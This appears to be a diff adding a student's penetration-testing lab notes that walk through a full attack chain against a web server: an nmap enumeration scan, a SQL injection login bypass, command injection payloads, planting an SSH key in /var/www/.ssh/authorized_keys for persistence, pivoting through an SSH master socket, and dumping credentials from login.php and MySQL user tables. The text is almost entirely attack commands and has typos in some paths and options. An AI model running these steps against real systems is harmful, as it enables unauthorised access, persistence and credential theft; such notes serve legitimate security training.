@@ -1,13 +1,57 @@
+#### Step 1 ####
+--Port Scanning IP & enumerate--
+nmap -p 80 --script=http-enum <IP address>    (Locates useful libraries that should be looked into)
+                                      /login.php
+                                      /login.html
+                                      /img
+                                      /scripts
+
+#### Step 2 ####
+--Employee Sign In using SQL Injection--    
+bob' OR 1='1 (user & pass)
+
+#cmd injection#
+; find / -name "*.ssh"    (finds ssh keys or location to insert)  Private key is for yourself **PUBLIC KEY IS UPLOADED**
+; ls -la     (lists everything in pwd that could be relevant)
+; whoami     (reveals user logged in as)
+
+#create/upload ssh key#
+lin-ops#  ssh-keygen -t rsa
+lin-ops#  cat /home/student/.ssh/id_rsa.pub
+vulnerable#   mkdir /var/www/.ssh
+vulnerable#   echo "public key" >> /var/www/.ssh/authorized_keys
+vulnerable#   cat /var/ww/.ssh/authorized_keys
 
 
+--URL on certain web links reveals vulnerability to inject--
+URL/<IP address>/login.php?username=bob' OR 1='1&passwd=bob' OR 1='1    (Gather all contents into login.php)
+
+--Upload link reveals that malicious injection could be used--
 
 
+#### Step 3 ####
+-Create Master Socket-
+-IP discovered in /etc/hosts-
+-Enumerate discovered IP-
+-Ping sweep with script-
 
-
-
-
-
-
+lin-ops#  ssh -MS /tmp/jump user2@10.50.158.70
+user2@public#  sudo -l
+  ls /var/tmp
+  ls /home
+  ps -elf
+  ls /etc/rsylog.d
+  cat *
+  uname -a   (for kernel version [4.15.0-213-generic])
+  ls -la /var/www/html
+  cat /var/ww/html/login.php   (could provide credentials)
+  mysql --user-webuser --pass=sqlpass
+  use session; 
+  show tables;
+  select * from session_log;
+  select * from user;
+  exit
+  
 
 
 
